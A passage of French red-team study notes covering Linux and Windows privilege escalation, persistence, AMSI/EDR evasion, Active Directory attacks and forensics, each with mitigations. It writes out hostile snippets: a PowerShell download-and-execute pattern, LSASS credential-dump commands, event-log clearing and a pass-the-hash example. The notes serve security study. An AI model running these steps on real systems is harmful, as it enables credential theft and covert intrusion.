  - Si le binaire appelle `system()` ou permet l'injection de commandes, utiliser pour exécuter shell (`/bin/sh`) ou déposer une reverse shell.
  - Exemple concret : SUID sur un script perl qui appelle `system($ENV{EDITOR})` et l'attaquant modifie `EDITOR` pour `/bin/sh`.
- **Mitigations**
  - Minimiser binaires SUID, appliquer updates, utiliser allowlist et auditing.
- **Glossaire rapide**
  - **system()** : appel en C lançant une commande shell depuis un programme.
  - **Reverse shell** : connexion sortante depuis la victime vers un attaquant donnant shell interactif.

---

## 4) Installer un accès persistant discret (persistence) en minimisant la détection

- **Options courantes**
  - `crontab -e` ou ajouter job dans `/etc/cron.d/` ou `/etc/cron.hourly/`.
  - `systemd` : créer un service `.service` ou `systemd` timer (moins évident car consigné dans journalctl).
  - SSH authorized_keys : ajouter clé publique à `~/.ssh/authorized_keys` (mais visible).
  - Kernel module / rootkit (risqué et détectable par SIEM/Integrity checks).
- **Conseils OPSEC pour discrétion**
  - éviter modifications massives; utiliser techniques living-off-the-land (binaries système) ; masquer via timestamps, minimiser connexions externes.
  - préférer persistence éphémère et rotation plutôt qu'installer backdoor permanente si règles d’engagement l'exigent.
- **Glossaire rapide**
  - **systemd timer** : alternative à cron dans `systemd` pour lancer tâches planifiées.
  - **SIEM** : système de gestion et corrélation de logs (Security Information and Event Management).

---

## 5) Trouver des secrets (configs, variables d’environnement, credentials en clair)

- **Emplacements typiques**
  - Fichiers de config : `/etc/`, `/home/*/.config/`, applications web (`config.php`, `.env`).
  - Variables d’environnement : `printenv`, `cat /proc/<pid>/environ` (si permissions le permettent).
  - Historiques : `~/.bash_history`, `~/.mysql_history`.
  - Services : fichiers unit systemd avec credentials en clair, scripts de déploiement.
- **Techniques**
  - Rechercher patterns (`API_KEY`, `PASSWORD`, `SECRET`, `TOKEN`) via `grep -R`.
  - Lister processus et inspecter `/proc/<pid>/fd` et `/proc/<pid>/cmdline` pour arguments en clair.
- **Glossaire rapide**
  - **.env** : fichier contenant variables d’environnement pour l’application.
  - **/proc** : pseudo-filesystem exposant informations processus et système.
  - **fd (file descriptor)** : pointeur vers un flux ouvert utilisé par un processus (fichiers, sockets).

---

## 6) Utilisation de `strace` / `ltrace` pour reverse engineering d’un binaire

- **`strace`**
  - Trace appels système (syscalls) : `strace -f -o trace.txt ./program` pour voir open/read/write/execve.
  - Utile pour identifier fichiers lus, commandes exécutées, et interactions réseau.
- **`ltrace`**
  - Trace appels de bibliothèques (fonctions libc) : montrer fonctions comme `system()`, `strcpy`, `sprintf`.
- **Méthodologie**
  - Exécuter binaire avec `strace` en environnement contrôlé, filtrer syscalls intéressantes (`open`, `execve`, `connect`).
  - Coupler avec `gdb` pour breakpoint et analyse plus fine si nécessaire.
- **Glossaire rapide**
  - **syscall** : appel système — interface entre application et kernel.
  - **gdb** : débogueur natif pour analyser exécution pas à pas.

---

## 7) Bypasser AppArmor/SELinux ou utiliser pour détection

- **Principes**
  - AppArmor/SELinux : Mandatory Access Control (MAC) limitant actions processus via politiques.
  - Bypasser est difficile sans privilèges; souvent les erreurs de politique (permissive mode) ou politiques trop larges exposent vecteurs.
- **Approche**
  - Vérifier mode (`getenforce` pour SELinux) et logs (`/var/log/audit/audit.log`).
  - Chercher politiques en `permissive` ou règles `allow` trop générales ; utiliser misconfigurations pour écrire dans répertoires restreints ou exécuter chaines.
  - Plutôt que bypass, utiliser politiques pour détecter comportements anormaux (alerte sur denied).
- **Glossaire rapide**
  - **MAC (Mandatory Access Control)** : contrôle d’accès basé sur politiques centrales (opposé à DAC).
  - **getenforce** : commande pour voir état SELinux (`Enforcing`, `Permissive`, `Disabled`).
  - **audit.log** : journal d’audit SELinux/AppArmor.

---

## 8) Récupérer des infos utiles depuis la mémoire et outils (`/proc`, `ss`, `netstat`, `ps`, `lsof`)

- **Commandes clés**
  - `ps aux` : lister processus.
  - `ss -tulpen` : sockets open (TCP/UDP), processus associés et ports.
  - `netstat -tulpn` : similaire (si installé).
  - `lsof -i` : lister fichiers/sockets réseau ouverts.
  - Inspecter `/proc/<pid>/environ`, `/proc/<pid>/cmdline`, `/proc/<pid>/maps` pour bibliothèques/mémoire mappée.
- **Usage**
  - Trouver connexions sortantes suspectes (C2), processus forkés, fichiers ouverts par un service.
  - Identifier PID LSASS equivalent on Linux (processus stockant secrets) — varies by distro/app.
- **Glossaire rapide**
  - **ss** : utilitaire moderne pour lister sockets.
  - **lsof** : list open files — montre fichiers, sockets et processus associés.
  - **/proc/pid/maps** : zones mémoire mappées pour un processus (librairies, segments).

## 9) Outils de post-exploitation (meterpreter, socat, netcat, cron, systemd timers) et pourquoi

- **Meterpreter**
  - Payload interactif (Metasploit) offrant modules pour pivot, dump credentials, upload/download, etc.
- **Netcat (`nc`)**
  - Outil polyvalent pour créer reverse/bind shells, transférer fichiers, ou tunneling simple.
- **Socat**
  - Plus puissant que netcat : permet redirection bidirectionnelle, TLS, proxys, et multiplexing.
- **Cron / systemd timers**
  - Utilisés pour persistance et exécution programmée d’actions malicieuses.
- **Pourquoi les utiliser**
  - Simplicité, disponibilité sur la plupart des systèmes, flexibilité pour pivoting et tunneling.
- **Glossaire rapide**
  - **C2 (Command and Control)** : infrastructure utilisée pour contrôler machines compromises.
  - **Bind shell vs reverse shell** : bind = machine victime écoute, attacker se connecte; reverse = victime se connecte à l'attaquant.

---

## 10) Parler d’une expérience où tu as durci ou contourné des protections Linux (auditing/EDR)

- **Structure pour l’entretien**
  - Situation : expliquer le contexte (box/engagement, scope).
  - Action : étapes techniques (audit, outils utilisés, tests non destructifs).
  - Résultat : découverte, remédiation proposée, réduction du risque mesurable.
- **Points à mettre en avant**
  - Utilisation de logs (`journalctl`, auditd), baselines, configuration d’EDR (ex: Osquery, Wazuh).
  - Expliquer tradeoffs (sécurité vs performance), recommandations pratiques (limiter SUID, chroot, renforcer sudoers).
- **Glossaire rapide**
  - **EDR (Endpoint Detection and Response)** : solution pour surveiller et répondre aux menaces sur endpoints.
  - **auditd** : démon d'audit Linux collectant événements système pour analyse.

---


# Windows 


## 1) Modèle de sécurité Windows (tokens, UAC, SID) et contournement UAC

- **Modèle de sécurité**
  - Chaque processus Windows s’exécute sous un **token d’accès** contenant l’identité, les groupes et privilèges.
  - Chaque ressource (fichier, registre, etc.) a une **ACL (Access Control List)** définissant qui peut y accéder.
  - **SID (Security Identifier)** : identifiant unique attribué à chaque compte/utilisateur/groupe.
  - **UAC (User Account Control)** : mécanisme qui sépare exécution utilisateur et élévation admin pour réduire la surface d’attaque.
- **Contournement UAC**
  - Exploiter applications whitelisted ou auto-élevées (autoElevate=true dans manifest).
  - Attaques typiques : *fodhelper*, *eventvwr*, *sdclt.exe*, *computerdefaults.exe* (appelent des clés registre contrôlables).
- **Glossaire rapide**
  - **Token d’accès** : structure qui décrit les droits d’un processus.
  - **ACL** : liste des permissions sur un objet.
  - **SID** : identifiant unique d’un utilisateur/groupe.
  - **UAC bypass** : élévation sans prompt via mécanismes Windows mal configurés.

---

## 2) Méthodes d’escalade de privilèges sous Windows

- **Services mal configurés**
  - Service lancé avec privilèges SYSTEM mais exécutable modifiable → remplacer binaire.
- **DLL hijacking**
  - Si une DLL est chargée depuis un chemin non sécurisé (PATH), placer une DLL malveillante prioritaire.
- **Token impersonation**
  - Utiliser tokens d’un processus avec privilèges élevés (via `incognito`, `mimikatz`, `SeImpersonatePrivilege`).
- **Unquoted service paths**
  - Chemin sans guillemets contenant des espaces, ex: `"C:\Program Files\Vulnerable Service\service.exe"` → Windows peut tenter d’exécuter `C:\Program.exe` si présent.
- **Glossaire rapide**
  - **SYSTEM** : compte le plus privilégié sous Windows.
  - **DLL hijacking** : exécution de code arbitraire en plaçant une DLL contrôlée.
  - **Token impersonation** : se faire passer pour un autre utilisateur en réutilisant son token.

---

## 3) Fonctionnement AMSI (Antimalware Scan Interface) et méthodes de contournement

- **Fonctionnement**
  - AMSI inspecte le contenu en mémoire avant exécution (scripts PowerShell, VBA, etc.).
  - Fournit une API que les AV/EDR peuvent hooker pour scanner le contenu.
- **Contournements**
  - Modifier la mémoire du processus pour désactiver `AmsiScanBuffer`.
  - Charger PowerShell sans AMSI (`powershell -version 2` ou via CLR injection).
  - Obfuscation de scripts pour éviter détection (variable substitution, split strings).
- **Glossaire rapide**
  - **AMSI** : interface d’analyse antimalware intégrée à Windows.
  - **EDR** : Endpoint Detection & Response (outil de surveillance en temps réel).

---

## 4) LSASS / Credential Guard — but et attaques possibles

- **LSASS (Local Security Authority Subsystem Service)**
  - Stocke et gère authentifications locales et réseau (hashs NTLM, tickets Kerberos).
- **Credential Guard**
  - Fonction Windows 10+ isolant secrets LSASS dans un conteneur sécurisé via Virtualization-Based Security (VBS).
- **Attaques**
  - Dump mémoire LSASS via `procdump`, `mimikatz`, ou lecture directe `/dev/mem` (nécessite SYSTEM).
  - Bypass Credential Guard : injection directe dans mémoire (non triviale, mitigée par HVCI/VBS).
- **Glossaire rapide**
  - **NTLM** : protocole d’authentification challenge-response hérité.
  - **VBS / HVCI** : isolation basée sur virtualisation empêchant lecture directe mémoire sensible.

---

## 5) Création d’un implant C2 (Command & Control) et contournement AV/EDR

- **Implant C2**
  - Programme discret communiquant avec serveur C2 pour exécuter commandes, exfiltrer données, etc.
  - Exemples : Empire agent, Covenant, custom implant HTTP/HTTPS/DNS.
- **Techniques d’évasion**
  - Obfuscation de chaînes, chiffrement des communications, polymorphisme.
  - Signature numérique valide (signing), exécution via processus légitime (*LOLBin* : living-off-the-land binary).
- **Glossaire rapide**
  - **C2** : serveur de Command & Control.
  - **LOLBin** : binaire Windows légitime utilisé à des fins malveillantes.
  - **Polymorphisme** : modification dynamique du code pour échapper détection.

---

## 6) OPSEC lors d’une campagne Windows (logs, nettoyage, LoL)

- **Bonnes pratiques OPSEC**
  - Limiter bruit réseau et journaux : désactiver logging PowerShell (`Set-ExecutionPolicy` contrôlé), effacer événements (`wevtutil cl`).
  - Utiliser outils natifs (LoLBins) au lieu d’outils externes.
  - Nettoyer artefacts : fichiers temporaires, services créés, clés de registre.
- **Glossaire rapide**
  - **wevtutil** : outil CLI pour gérer journaux Windows.
  - **LoLBins** : binaires Windows utilisables pour exécution arbitraire (ex: `mshta`, `certutil`, `regsvr32`).

---

## 7) Persistance (Scheduled Tasks, Services, Run Keys, WMI)

- **Méthodes courantes**
  - **Scheduled Tasks** : planifier exécution d’un binaire au démarrage (`schtasks /create`).
  - **Services** : créer un nouveau service ou modifier un service existant pour exécuter code arbitraire.
  - **Run Keys** : clés registre `HKCU/HKLM\Software\Microsoft\Windows\CurrentVersion\Run`.
  - **WMI Event Subscription** : déclenche exécution lors d’événement système.
- **Glossaire rapide**
  - **HKCU / HKLM** : hives de registre (Current User / Local Machine).
  - **WMI (Windows Management Instrumentation)** : interface d’administration système scriptable.

---

## 8) PowerShell pour intrusion (modules, encodage, AMSI bypass)

- **Usage offensif**
  - Télécharger & exécuter scripts en mémoire (`IEX (New-Object Net.WebClient).DownloadString()`).
  - Encoder scripts (`-EncodedCommand`), obfuscation (`Out-String`, split, base64).
  - Charger modules offensifs : PowerView, PowerUp, Nishang, etc.
- **AMSI bypass (rappel)**
  - Modifier fonction `AmsiScanBuffer` ou utiliser PowerShell v2 (non AMSI).
- **Glossaire rapide**
  - **IEX** : alias PowerShell pour `Invoke-Expression` (exécution d’une chaîne comme code).
  - **PowerView / PowerUp** : modules PowerShell d’audit et d’escalade de privilèges.

---

## 9) Analyser un dump LSASS pour récupérer credentials

- **Méthodes**
  - `procdump.exe -ma lsass.exe lsass.dmp` ou `rundll32 comsvcs.dll, MiniDump`.
  - Analyse avec `mimikatz`, `pypykatz`, ou `LaZagne` pour extraire hash/cleartext.
- **Limitations**
  - Besoin de privilèges SYSTEM.
  - Credential Guard ou EDR peuvent bloquer l’accès ou détecter tentative.
- **Glossaire rapide**
  - **procdump** : outil Sysinternals pour dumper mémoire d’un processus.
  - **mimikatz** : outil open-source d’extraction de credentials.

---

## 10) Détection et contournement EDR (principes)

- **Détection**
  - EDR surveille appels API, injections mémoire, création de processus, comportements anormaux.
- **Contournement**
  - Injection dans processus signés (`explorer.exe`, `svchost.exe`), désactivation hooks via `syscall` direct, chiffrement du payload.
  - Utiliser exécution indirecte (ex: `rundll32`, `wmic`, `regsvr32`) pour masquer l’origine.
- **Glossaire rapide**
  - **Hook** : interception d’un appel API par un programme tiers.
  - **Syscall direct** : appel système sans passer par API hookée.
  - **Process injection** : insérer code dans un autre processus légitime.




# Active Directory (AD) 


# Kerberos — Flux, Kerberoasting et AS-REP Roasting

Ce document résumé est prêt pour Obsidian. Il regroupe :
1. Le flux d'authentification Kerberos dans un Active Directory (TGT, TGS),
2. Kerberoasting — concept, méthode, détection et mitigation,
3. AS-REP Roasting — explication technique et contre-mesures.

---

## 1) Flux d'authentification Kerberos dans AD (TGT, TGS)

### Étapes principales

1. **Authentification initiale (AS — Authentication Service)**
   - Le **client** (utilisateur) envoie une requête **AS-REQ** au KDC en indiquant son principal (ex: `alice@DOMAINE.LOCAL`).
   - Si la pré-authentification est requise, le client prouve connaissance du mot de passe via `PA-ENC-TIMESTAMP` ou un mécanisme équivalent.
   - Le KDC/AS répond par un **AS-REP** qui contient :
     - un **TGT** (Ticket Granting Ticket) chiffré avec la clé longue-terme du **TGS** (donc uniquement déchiffrable par le TGS),
     - une **enc_part** chiffrée avec la clé dérivée du mot de passe du client (K_client) contenant la **clé de session** `K_c_tgs` et d'autres infos.
   - Le client déchiffre l'enc_part avec sa clé dérivée du mot de passe ; s'il réussit il récupère `K_c_tgs`.

2. **Obtention de ticket de service (TGS — Ticket Granting Service)**
   - Le client envoie une **TGS-REQ** au TGS contenant :
     - le **TGT** reçu précédemment,
     - un **authenticator** (contenant identifiant client + timestamp) chiffré avec `K_c_tgs`.
   - Le TGS déchiffre le TGT pour obtenir `K_c_tgs`, déchiffre l'authenticator et vérifie fraîcheur/identité.
   - Si tout est valide, le TGS renvoie une **TGS-REP** contenant un **service ticket** chiffré avec la clé du service ciblé et une copie de la clé de session pour le client.

3. **Accès au service (AP — Application Service Exchange)**
   - Le client envoie au serveur cible le **service ticket** + un nouvel **authenticator** chiffré avec la clé de session client–service.
   - Le serveur déchiffre le ticket (avec sa clé stockée, ex: keytab) et vérifie l'authenticator : si valide, il accorde l'accès.

### Pourquoi le **TGT** existe (vs stocker l'état côté KDC)
- **Statelessness & scalabilité** : le TGT est auto-contenant et évite d'avoir une base de sessions partagée entre AS/TGS ou plusieurs KDCs.
- **Moins de surface d'attaque** : pas de stockage central de clés de session en clair ; un attaquant devrait compromettre la clé du TGS (`krbtgt`) pour lire/forger des TGT.
- **Fonctionnalités** : flags (renewable, forwardable, proxiable) et champs (expiration, realm) sont embarqués dans le ticket, facilitant délégation et cross-realm.

### Comment le client prouve qu'il connaît `K_c_tgs`
- Le client chiffre un **authenticator** (timestamp + principal) avec `K_c_tgs` et l'envoie au TGS. Si le TGS peut déchiffrer et valider le timestamp/freshness, alors il sait que le client connaît `K_c_tgs` sans que le mot de passe ait transité.
- C'est la preuve cryptographique : réussite du déchiffrement + concordance des champs.

---

## 2) Kerberoasting — concept et méthode (synthèse adaptée)

### Principe
- **Kerberoasting** cible les **comptes de service** qui possèdent un **SPN (Service Principal Name)**.
- Quand un client demande un ticket pour un SPN, le TGS renvoie un **service ticket** dont la partie chiffrée (enc_part) est chiffrée avec une clé liée au mot de passe du compte de service.
- Un attaquant authentifié peut demander ces tickets légitimement, extraire le blob chiffré et tenter de récupérer le mot de passe **hors-ligne** (cracker le « hash » chiffré).

### Étapes (conceptuelles)
1. Énumérer les comptes ayant un **SPN** (ex: via LDAP ou `Get-NetUser -SPN`).
2. Demander un ticket TGS pour le SPN ciblé (comportement client normal).
3. Exporter le ticket chiffré (outil d'audit) et lancer une attaque hors-ligne pour cracker la clé dérivée du mot de passe du compte de service.

> **Remarque** : ici on attaque le **mot de passe du compte de service**, pas la clé de session transitoire.

### Conditions favorables
- Comptes de service basés sur des comptes utilisateur (pas gMSA), avec SPN configuré.
- Mots de passe faibles ou peu/rarement renouvelés.
- Chiffrement faible (ex: RC4) ou absence de contrôles supplémentaires.

### Indicateurs de détection
- Pics de requêtes **TGS-REQ** pour de nombreux SPN depuis le même compte/machine.
- Énumération massive d'objets avec SPN via LDAP.
- Requêtes anormales de TGS suivies d'aucune authentification côté service (pattern d'énumération).

### Mitigations clés
- Préférer **gMSA / Managed Service Accounts** (mot de passe géré automatiquement).
- Mots de passe forts et rotation régulière pour comptes de service.
- Restreindre le nombre de comptes avec SPN.
- Forcer l'utilisation d'encryption moderne (AES) et désactiver/en limiter RC4.
- Mettre en place la détection SIEM décrite ci‑dessus.

---

## 2 bis) AS-REP Roasting — explication technique et contre-mesures

### Principe
- **AS-REP Roasting** exploite les comptes pour lesquels **la pré-authentification Kerberos est désactivée** (`Do not require Kerberos preauthentication` dans AD).
- Si la pré-authentification est désactivée, l'AS répondra à une **AS-REQ** sans challenger le client : la réponse `AS-REP` contient un `enc_part` chiffré avec la clé dérivée du mot de passe du compte.
- L'attaquant récupère ce `enc_part` et tente un bruteforce hors-ligne pour retrouver le mot de passe (ou la clé dérivée).

### Ce qu'on brute-force réellement
- On testera des mots de passe candidats, on en dérive la clé (selon l'enctype, salt, iterations) et on tente de déchiffrer/valider l'`enc_part`.
- Validation : si le déchiffrement produit un format attendu (checksum, timestamp valide), le mot de passe candidat est probablement correct.

### Conditions requises
- Compte ciblé avec **pré-auth désactivée**.
- Mot de passe crackable (faible, pas de longueur/complexité suffisante).

### Détections
- AS-REQs en masse pour comptes ayant le flag « does not require preauthentication ».
- Réponses AS-REP anormales corrélées à des activités d'énumération.
- Surveillance des modifications d'attributs AD liés à la pré-authentication.

### Mitigations
- **Activer la pré-authentification** pour tous les comptes (désactiver l'option « does not require preauthentication »).
- Exiger des mots de passe longs et complexes.
- Restreindre/mettre sous contrôle les comptes legacy qui nécessitent la pré-auth désactivée.
- Mettre en place MFA (Smartcard, certificat) pour réduire la dépendance au seul mot de passe.

---

## Glossaire rapide
- **KDC** : Key Distribution Center (AS + TGS).
- **TGT** : Ticket Granting Ticket. Ticket chiffré que le client présente au TGS.
- **TGS** : Ticket Granting Service. Délivre les tickets de service.
- **Ticket** : blob chiffré contenant identité, clé de session, durée, flags.
- **SPN** : Service Principal Name (ex: `HTTP/www.example.com`).
- **gMSA / MSA** : comptes de service gérés (rotations automatiques de mot de passe).


---

## 3) AS-REP roasting — quand applicable et comment

- **Principe**
  - Si un compte utilisateur/service n’exige pas l’authentification pre-auth (PreAuthentication disabled), on peut demander un AS-REP qui est chiffré avec une clé dérivée du mot de passe du compte ; cet AS-REP peut être bruteforcé hors-ligne.
- **Détection**
  - Vérifier l’attribut `DONT_REQUIRE_PREAUTH` sur les comptes (`Get-ADUser -Properties * | where { $_.UserAccountControl -band 4194304 }`).
- **Mitigations**
  - Activer pre-auth pour tous les comptes, forcer mots de passe forts, monitoring des requêtes AS-REP.
- **Glossaire rapide**
  - **Pre-auth** : mécanisme où le client prouve son identité avant que le KDC délivre des tickets.
  - **AS-REP roasting** : extraction brute-force hors-ligne d’un AS-REP pour retrouver mot de passe.

---

## 4) Pass-the-Hash (PtH) et Pass-the-Ticket (PtT)

- **Pass-the-Hash**
  - Réutiliser le NTLM hash d’un compte pour s’authentifier sans connaître le mot de passe en clair.
  - Exécution typique : extraire hash (mimikatz, secretsdump) et utiliser `psexec`, `wmiexec` ou outils équivalents pour s’authentifier.
- **Pass-the-Ticket**
  - Réutiliser un ticket Kerberos (TGT/TGS) obtenu pour s’authentifier sur d’autres services sans mot de passe.
  - Golden Ticket = ticket forgé en utilisant la clé du domaine (`krbtgt`) permettant accès quasi-illimité.
- **Mitigations**
  - LSA protection, rotation régulière du compte `krbtgt` (double rotation recommended), limiter privilèges d’administration locale, use of Protected Users group and Credential Guard.
- **Glossaire rapide**
  - **Golden Ticket** : TGT forgé avec la clé Kerberos du domaine (`krbtgt`) donnant accès complet.
  - **Credential Guard** : protection Microsoft isolant secrets d'authentification.

---

## 5) DCSync / DCSync abuse — ce que c’est et permissions nécessaires

- **Principe**
  - Fonctionnalité native (replication) permise aux DCs : un compte ayant `Replicating Directory Changes` et `Replicating Directory Changes All` peut demander des données de réplication (comportement DCSync).
  - Un attaquant qui obtient ces droits peut demander et extraire les hash/passwords de comptes sans compromettre DC directement.
- **Détection**
  - Surveiller requêtes LDAP anormales et l’utilisation de droits de réplication hors heure normale.
  - Utiliser bloodhound pour détecter entités avec ces droits.
- **Mitigations**
  - Restreindre droits de réplication, utiliser GPOs restrictifs, monitorer les changements d’ACL.
- **Glossaire rapide**
  - **DCSync** : simulation de comportement de réplication pour extraire secrets via RPC/LDAP.
  - **Replicating Directory Changes** : permission AD permettant lecture de changements.

---

## 6) Reconnaissance AD discrète (BloodHound, LDAP queries)

- **Techniques discrètes**
  - Utiliser commandes natives (nltest, net, dsquery) ou LDAP queries pour récupérer info sans déclencher alertes bruyantes.
  - BloodHound (avec SharpHound collector) mappe relations (sessions, group memberships, ACLs) ; exécuter collection en "spider" mode ou via SMB to avoid noisy LDAP queries.
- **Bonnes pratiques lors d’un engagement**
  - Limiter fréquence des requêtes, récolter données incrémentales, masquer sources (relay via pivot).
- **Glossaire rapide**
  - **BloodHound** : outil d’analyse de graph AD pour trouver chemins d’élévation de privilèges.
  - **LDAP** : protocole d’accès à l’annuaire (Lightweight Directory Access Protocol).

---

## 7) Vecteurs pour obtenir comptes privilégiés (GPO misconfigurés, SPNs, ACLs faibles)

- **Exemples de vecteurs**
  - GPO avec scripts ou preferences stockant credentials en clair.
  - SPN permettant kerberoast.
  - ACLs faibles sur objets AD (par ex: ability to set `msDS-ManagedPassword`).
  - Shadow credentials in gMSA or service accounts with weak passwords.
- **Recommandations**
  - Auditer GPO/policies, restreindre accès sur objets sensibles, utiliser tiered admin model (PAM/PAW).
- **Glossaire rapide**
  - **GPO** : Group Policy Object — configuration centralisée appliquée aux machines et utilisateurs.
  - **gMSA / MSA** : comptes de service gérés permettant rotation automatique de mot de passe.

---

## 8) Over-pass the Hash / Golden Ticket / Silver Ticket — différences

- **Over-pass the Hash**
  - Attaque combinant techniques Kerberos/NTLM pour demander un TGT via NTLM-derived credentials (complexe et spécifique).
- **Golden Ticket**
  - Forgé en manipulant la clé du service `krbtgt` pour générer TGT valides pour n’importe quel utilisateur.
  - Permet accès durable et quasi-total au domaine (until krbtgt rotated twice).
- **Silver Ticket**
  - Ticket TGS forgé pour un service spécifique (chiffré avec clé de service), limite portée à ce service seulement.
- **Mitigations**
  - Rotation du compte `krbtgt`, monitoring for abnormal ticket lifetimes, use of constrained delegation, disable unconstrained delegation where possible.
- **Glossaire rapide**
  - **Silver Ticket** : TGS forgé ciblant un service précis (moins puissant que Golden Ticket).
  - **Constrained delegation** : delegation limitée aux services explicitement autorisés.

---

## 9) Méthodologie pour compromettre un domaine depuis un poste utilisateur compromis

- **Étapes courantes**
  - **Initial foothold** : accès user local via phishing/exploit.
  - **Credential harvesting** : dump caches, browsers, LSASS, Mimikatz, credentials in scripts.
  - **Lateral movement** : Pass-the-Hash, Pass-the-Ticket, WMI/PSExec/SMB relay.
  - **Privilege escalation** : kerberoast, exploit poorly configured services, ACL abuse, DCSync.
  - **Domain persistence & cleanup** : Golden Ticket, create backdoor accounts with limited naming, adjust logs/OPSEC.
- **Glossaire rapide**
  - **Foothold** : point d’ancrage initial dans le réseau.
  - **Lateral movement** : déplacement latéral entre machines pour étendre accès.

---

## 10) Stratégies de mitigation et détection après engagement Red Team

- **Actions immédiates**
  - Rotation des secrets (mots de passe, clés service, krbtgt double-rotation).
  - Revue et durcissement des ACLs, restreindre rights (Replicating Directory Changes).
- **Détection & monitoring**
  - Activer alerting sur DCSync, high volume of AS-REP/kerberoast requests, abnormal account usage, long-lived tickets.
  - Deploy EDR detections for suspicious Kerberos usage, bloodhound-like queries.
- **Long-term**
  - Mise en place d’un modèle d’administration en étages (Tiered Access), PAM (Privileged Access Management), bastion hosts (PAW).
  - Formation et testing régulier (Red Team/Blue Team exercises).
- **Glossaire rapide**
  - **PAM** : Privileged Access Management — solution pour gérer accès privilégiés.
  - **PAW** : Privileged Access Workstation — poste isolé pour opérations sensibles.

## 11) Qu’est-ce que NTLM

- **Concept**
  - NTLM (NT LAN Manager) est un protocole d’authentification challenge-response historique utilisé par Windows pour authentifier clients et services lorsque Kerberos n’est pas disponible.
  - Fonctionnement simplifié :
    - Le client demande une ressource.
    - Le serveur envoie un **challenge** (nonce aléatoire).
    - Le client calcule une **réponse** en chiffrant le challenge avec le hash du mot de passe (NT hash) et renvoie la réponse.
    - Le serveur (ou un contrôleur) vérifie la réponse et autorise l’accès si elle est correcte.
- **Versions & limitations**
  - **LM** (LanManager) : obsolète et très faible (séparait mot de passe en deux moitiés, facilement cassable).
  - **NTLMv1** : amélioration partielle, vulnérable au relay et bruteforce.
  - **NTLMv2** : plus robuste (meilleur challenge/response), mais reste sujet à certaines attaques (relay, pass-the-hash) si le réseau n’est pas bien durci.
- **Propriétés importantes**
  - NTLM repose sur des **hashs de mot de passe** (NT hash) — le mot de passe en clair n’est pas envoyé, mais le hash suffit souvent pour s’authentifier.
  - Présent dans beaucoup d’environnements legacy ; activé par défaut sur certains chemins/compatibilités.
- **Glossaire rapide**
  - **Challenge-response** : méthode où le serveur envoie un défi que le client signe pour prouver son identité.
  - **NT hash (NTLM hash)** : empreinte dérivée du mot de passe Windows; réutilisable pour authentification.
  - **SMB / HTTP Negotiate** : protocoles/points d’entrée où NTLM peut être utilisé.

---

## 12) Exemple d’attaque basée sur NTLM (Pass-the-Hash / NTLM relay)

- **But de l’attaque**
  - Authentifier sur une autre machine/service en réutilisant un **NT hash** ou en relayant une authentification NTLM capturée, sans connaître le mot de passe en clair.
- **Étapes (Pass-the-Hash — PtH)**
  1. **Récupérer le NT hash** d’un compte sur une machine compromise (ex: via `mimikatz`, `secretsdump.py` d’Impacket, ou en extrayant `SAM`/`NTDS.dit` si accès possible).
  2. **Importer / utiliser le hash** avec un outil (ex: `psexec.py`, `wmiexec.py`, `smbexec` d’Impacket, ou `pth-toolkit`) pour s’authentifier à distance contre d’autres hôtes en présentant le hash comme preuve d’identité.
  3. **Exécuter commandes / se propager** : lancer payloads, déposer backdoors, ou escalader latéralement sur d’autres systèmes en bénéficiant des droits du compte dont le hash a été volé.
- **Étapes (NTLM Relay)**
  1. **Intercepter une tentative NTLM** d’un client vers un service (ex: via LLMNR/NBT-NS poisoning ou sur un segment réseau accessible).
  2. **Relayer la tentative** vers un service cible qui accepte NTLM (ex: SMB, HTTP, LDAP) : l’attaquant fait suivre la preuve d’authentification captée au service cible.
  3. **Authentification réussie** : si le service cible accepte NTLM et n’exige pas signing / extended protections, l’attaquant est authentifié au nom du client sans jamais connaître son mot de passe.
  4. **Exploitation** : exécution de commandes, accès fichiers partagés, ou écriture de service/clé de registre pour persistance.
- **Exemple concret**
  - Compromis d’un poste utilisateur → extraction NT hash du compte `DOMAIN\user` via `mimikatz` → utilisation de `wmiexec.py DOMAIN/user@target` avec le NT hash pour obtenir une session shell sur `target` → utilisation des credentials pour accéder à d’autres ressources internes.
  - Ou : LLMNR spoofing (Responder) capte une auth NTLM → `ntlmrelayx` relaye cette auth vers un serveur SMB habilité → l'attaquant obtient accès immédiat au partage réseau.
- **Mitigations**
  - **Désactiver / limiter NTLM** (encourager Kerberos), activer et exiger **SMB signing**, implémenter **Extended Protection for Authentication (EPA)**, bloquer LLMNR/NBT-NS et utiliser DNS sécurisé, déployer MFA, restreindre droits des comptes de service et monitorer utilisations anormales d’authentifications.
- **Glossaire rapide**
  - **Pass-the-Hash (PtH)** : réutilisation d’un hash NTLM pour s’authentifier sans mot de passe.
  - **NTLM relay** : redirection d’une authentification NTLM captée vers un autre service pour s’authentifier au nom de la victime.
  - **LLMNR/NBT-NS poisoning** : techniques de spoofing de résolution de noms locales permettant de capturer authentifications.


# Forensic — Fiche Red Team

---

## 1) Méthodologie pour collecter des preuves sur une machine compromise

- **Principes**
  - Préserver l'intégrité des preuves : acquisition bit-for-bit, calcul de hash (MD5/SHA256) avant/après transfert.
  - Respecter la chaîne de custody (qui a manipulé quoi, quand).
  - Prioriser la collecte volatile (mémoire, connexions réseau) avant shut down si possible.
- **Étapes pratiques**
  - Documenter l’état initial (screenshots, liste de process, connexions réseau).
  - Dumper la mémoire (`winpmem`, `volatility` plugins, `dd`/`gnome-disk` selon OS).
  - Faire une image disque bit-for-bit (`dd`, `FTK Imager`, `dcfldd`) et calculer hash.
  - Collecter logs (Event Viewer, syslog, application logs), fichiers de config, artefacts utilisateur.
- **Glossaire rapide**
  - **Acquisition bit-for-bit** : copie exacte du média incluant secteurs non alloués.
  - **Chain of custody** : enregistrement officiel des manipulations des preuves.
  - **Volatile data** : données en mémoire RAM ou connexions qui disparaissent au redémarrage.

---

## 2) Artefacts Windows pour établir une timeline

- **Sources clés**
  - *Event Logs* (`Security`, `System`, `Application`) : événements d’auth, services, erreurs.
  - *MFT (Master File Table)* : timestamps de création/modification/suppression des fichiers (NTFS).
  - *Prefetch* : indique exécution d’applications (Windows ≤10) et chemins.
  - *Registry* : `HKCU\Software`, `Run` keys, `Amcache.hve`, `SAM` informations.
  - *Scheduled Tasks* : `Task Scheduler` entries.
- **Utilisation**
  - Corréler horodatages entre sources, prendre en compte décalages horaires et UTC.
  - Utiliser timelines (Plaso/Log2Timeline) pour automatiser la corrélation.
- **Glossaire rapide**
  - **MFT** : table contenant métadonnées fichiers sur NTFS.
  - **Prefetch** : mécanisme Windows optimisant démarrage d’apps, utile pour forensics.
  - **Plaso / log2timeline** : outils pour construire timeline unifiée à partir de multiples sources.

---

## 3) Analyser une image disque Linux pour traces d’intrusion

- **Étapes**
